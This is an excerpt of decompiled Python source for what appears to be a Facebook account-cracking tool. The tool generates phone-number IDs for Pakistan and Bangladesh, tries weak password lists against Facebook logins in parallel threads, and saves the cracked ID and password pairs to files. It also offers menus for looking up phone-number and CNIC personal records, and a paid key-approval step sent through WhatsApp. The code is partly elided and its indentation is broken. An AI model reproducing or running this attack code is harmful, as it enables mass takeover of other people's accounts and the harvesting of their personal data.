...
"""\033[1;32m  
╔═════════════════════════════════════════════════╗\033[1;31m
║    WELCOME TO  FACEBOOK  CRACK  PROW            ║\033[1;33m
║═════════════════════════════════════════════════║\033[1;33m                     
║\033[0;37m##     ##    ###    ##     ## ########  ####     ║
║\033[1;92m###   ###   ## ##   ##     ## ##     ##  ##      ║
║\033[1;93m#### ####  ##   ##  ##     ## ##     ##  ##      ║
...
def menu():
			...
			os.system('clear')
			MAHDI(logo)
			MAHDI('\033[0;33m[1] File Cloning menu               \033[1;32m[V1]')
			MAHDI('\033[0;32m[2] Pak Random Cloning menu         \033[1;33m[V1]')
			MAHDI('\033[0;37m[3] BD  Random Cloning menu         \033[1;32m[V1]')
			MAHDI('\033[0;33m[4] Random Choice Pass              \033[1;37m[V1]')
			MAHDI('\033[0;32m[5] Get any  number data            \033[1;31m[V1]')
			MAHDI('\033[0;37m[6] Get any CNIC number data        \033[1;32m[V1]')
			MAHDI('\033[0;33m[7] Follow me on Facebook           \033[1;37m[V1]')
			MAHDI('\x1b[1;91m[8] Exit main menu            \033[1;31m[V1]')
			linex()
			riaz=input('\033[1;33m[]Choose an option: ')
			if riaz in ['1','01']:
				os.system('clear')
				MAHDI(logo)
				
				linex()
				MAHDI(' Example : /sdcard/MAHDI.txt')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					MAHDI(' File location not found ')
					time.sleep(1)
					menu()
				os.system('clear')
				MAHDI(logo)
				MAHDI('[1] File Method\x1b[1;92m [1] \n\x1b[1;97m[2] File Method \x1b[1;92m[2]')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					os.system('clear')
					MAHDI(logo)
					MAHDI(' Example : 1 , 2 ,3, 4 ,5 ,6 ,7 ,8, 9 ,****,Etc')
					linex()
				...
				os.system('clear')
				MAHDI(logo)
				MAHDI(' Example : first last,firstlast,first12345,***Etc')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				os.system('clear')
				MAHDI(logo)
				MAHDI(' Do you want Show Cookies : ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=25) as crack_submit:
					...
					MAHDI(' Total Acounts   : '+total_ids)
					MAHDI(' Selected Method : \x1b[1;92mM '+mthd)
					MAHDI(' \x1b[1;91mIf you no result use flight mode')
					linex()
					for user in fo:
						...
						if mthd in ['1','01']:
							...
							crack_submit.submit(mahdi,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				MAHDI('\033[1;37m')
				linex()
				MAHDI(' The process has completed')
				MAHDI(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				...
				os.system('xdg-open https://facebook.com/bk4human');menu()
			elif riaz in ['8','08']:
				exit('')
			else:
				exit(' Option not found in menu...')
		
def mahdi(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMAHDI\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				MAHDI('\033[1;92m[MAHDI-OK] '+ids+' | '+pas+'\033[1;32m')
				shuvo('/sdcard/MAHDI-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					MAHDI('\33[1;31m[MAHDI-CP] '+ids+' | '+pas+'\33[0;97m')
					shuvo('/sdcard/MAHDI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					MAHDI('\33[1;91m[MAHDI-CP] '+ids+' | '+pas+'\33[0;97m')
					shuvo('/sdcard/MAHDI-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def riaz1():
	os.system('clear')
	MAHDI(logo)
	MAHDI('\x1b[1;97m[1] Pak Random Method \x1b[1;92m[1]')
	MAHDI('\x1b[1;97m[2] Pak Random Method \x1b[1;92m[2]')
	MAHDI('\x1b[1;97m[3] Pak Random Method \x1b[1;92m[3]')
	MAHDI('\x1b[1;97m[4] Pak Random Method \x1b[1;92m[4]')
	MAHDI('\x1b[1;97m[5] Pak Random Method \x1b[1;92m[5]')
	MAHDI('\x1b[1;97m[6] Pak Random Method \x1b[1;92m[6]')
	MAHDI('\x1b[1;91m[7] Go to main menu')
	linex()
...
def random_number1():
	...
	os.system('clear')
	MAHDI(logo)
	MAHDI('[√] EXAMPLE :92318,92345,92323,92306.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	MAHDI(logo)
	MAHDI(' Example : 1000,5000,10000,****Etc')
	linex()
	...
	with ThreadPool(max_workers=35) as yaari:
        ...
        MAHDI(logo)
		tl = str(len(uid))
		MAHDI(' Total Acounts : '+tl)
		MAHDI(' Selected Code : \x1b[1;92m'+kode)
		MAHDI('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
	...
	linex()
	MAHDI('[✓] Crack process has been completed')
	MAHDI('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
...
def bd():
	os.system('clear')
	MAHDI(logo)
	MAHDI('\x1b[1;97m[1] BD Randm ALL SIM\x1b[1;92m [VEST]')
	MAHDI('\x1b[1;97m[2] BD Randm Method \x1b[1;92m[CHOUSE SIM]')
	MAHDI('\x1b[1;97m[3] BD Randm Method \x1b[1;92m[CHOUSE SIM]')
	MAHDI('\x1b[1;91m[4] Go to main menu')
	linex()
	MahdI_ini=input('Select option :')
	if MahdI_ini =='1':
		bd1()
	if MahdI_ini =='2':
		bd2()
...
def bd1():
    ...
    rk4 = '019'
	linex()
	kode = random.choice([rk1,rk2,rk3,rk4])
	os.system('clear')
	MAHDI(logo)
	MAHDI(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		tl = str(len(uid))
		MAHDI(' Total Acounts : '+tl)
		MAHDI(' CREATE  : \x1b[1;92mMAHDI HASAN')
		MAHDI('\x1b[1;91m If you no result use flight mode')
        MAHDI('\x1b[1;91m BD ALL DIGIT NUMBER CLONING')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,guru[1:],kode+guru[0:1],guru[2:]]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
    MAHDI('[✓] Crack process has been completed')
	MAHDI('[?] Idz saved in [ok.txt,cp.txt]')
...
def bd3():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'mahdi123','free fire','shuvo123']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
...
def chos():
    ...
    os.system("clear")
    MAHDI(logo)
    MAHDI('\x1b[1;91m[+] See Not : Use Your Sim Code ')
    linex()
    ...
    os.system('clear')
    MAHDI(logo)
    MAHDI('[+] Example : mahdi12345,bangladish,baloch,***Etc')
    linex()
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        tl = str(len(user))
        MAHDI(' Total Acounts : '+tl)
        MAHDI(' Selected Code :\x1b[1;92m '+code)
        MAHDI('\x1b[1;91m If you no result use flight mode')
        linex()
        for love in user:
            pwx = [love[1:],love,'thank you','password']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    linex()
    MAHDI('Crack process has been completed')
    MAHDI('Ids saved in MAHDI-ok.txt,MAHDI-cp.txt')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				MAHDI('\033[1;92m[MAHDI-OK] '+cid+' | '+ps+'\033[1;32m')
				shuvo('/sdcard/MAHDI-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				#MAHDI('\33[1;31m[MAHDI-CP] '+cid+' | '+ps+'\33[0;97m')
				shuvo('/sdcard/MAHDI-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
...
def main():
        ...
        MAHDI(logo)
        linex()
        MAHDI('[1] Get any number data')
        MAHDI('[2] Get CNIC number data')
        MAHDI('[3] Go to main menu')
        linex()
        xd = input(' Choose : ')
        if xd =='1':
            zong()
...
def cinc():
    os.system('clear')
    MAHDI(logo)
    MAHDI(' example : 157022100****,1347583***,Etc')
    linex()
    ...
    try:
        lines()
        try:MAHDI(f" \033[1;37mCinc Num   : \033[1;31m{ndt[5]}")
        except:pass
        try:MAHDI(f"\033[1;37m IP Addres  : \033[1;37m{ndt[3].lower()}")
        except:pass
        try:MAHDI(f'\033[1;37m City Name  : \033[1;37m{ndt[27]}')
        except:pass
...
# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++# Source Generated with Decompyle++
...
def reg():
    ...
    if to in r:
        ...
        time.sleep(3.5)
        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to+mhs
...
def reg2():
    ...
    print("            \033[1;97mTHIS TOOL IS PAID YOU NEED TO GET APPROVED FIRST")
    print ('               \033[1;97mYOUR KEY : ' + id+mhs)
    print("               COPY AND SEND KEY TO ADMIN")
    name = input("               YOUR NAME : ")
    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
    time.sleep(3.5)
    tks = 'Dear%20MAHDI-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id+mhs
    os.system('am start https://wa.me/+8801616406924?text=' + tks)
